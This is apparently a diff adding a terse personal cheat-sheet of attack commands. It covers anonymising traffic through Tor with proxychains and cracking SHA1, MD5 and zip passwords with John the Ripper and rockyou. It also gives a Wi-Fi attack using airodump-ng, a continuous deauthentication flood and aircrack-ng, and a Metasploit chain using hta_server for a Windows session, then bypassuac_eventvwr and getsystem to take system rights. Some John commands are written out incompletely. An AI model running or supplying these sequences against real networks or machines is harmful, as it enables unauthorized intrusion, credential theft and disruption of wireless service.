@@ -1,0 +1,106 @@
+Proxychains 
+
+sudo service tor status 
+
+sudo service tor start 
+
+leafpad or vim or gedit /etc/proxychains.conf
+uncomment proxy_dns and dynamic_chain and comment strict_chain
+and write socks5 and ip same as above 
+
+
+leafpad /usr/lib/proxychains3/proxyresolv
+change dns to 8.8.8.8
+
+proxychains firefox google.com
+
+John the Ripper 
+
+singlecrackmode
+john --single --format=raw-sha1 sha1.txt
+
+wordlist crack
+wordlist=/usr/share/wordlists/rockyou.txt -format=raw-sha sha.txt 
+wordlist=/usr/share/wordlists/rockyou.txt -format=raw-sha1 sha.txt 
+ 
+ 
+
+md5
+wordlist=/usr/share/wordlists/rockyou.txt -format=raw-md5 md5.txt 
+
+
+zip file crack 
+zip2john protected.zip > crack77.txt 
+
+
+wireless attack 
+
+iwconfig 
+
+sudo airmon-ng check kill 
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+
+airodump-ng wlan0mon -c 1 --bssid 12345 -w targetfile
+
+aireplay-ng --deauth 0 -a 12345(bssid) wlan0mon
+
+aircrack-ng -w Desktop/wordlist.rxt targetfile-01.cap
+
+Metasploit
+
+
+msfconsole 
+
+
+use exploit windows/misc/hta_server
+show options 
+
+ipconfig  see ip address then 
+
+set lhost ip address
+set srvhost ip address
+set lport 8111
+exploit 
+
+
+sessions -i
+
+
+for root access 
+
+use exploit windows/local/bypassuac_eventvwr
+
+show options 
+
+set session 1 
+exploit 
+sysinfo 
+
+
+help
+
+getsystem 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
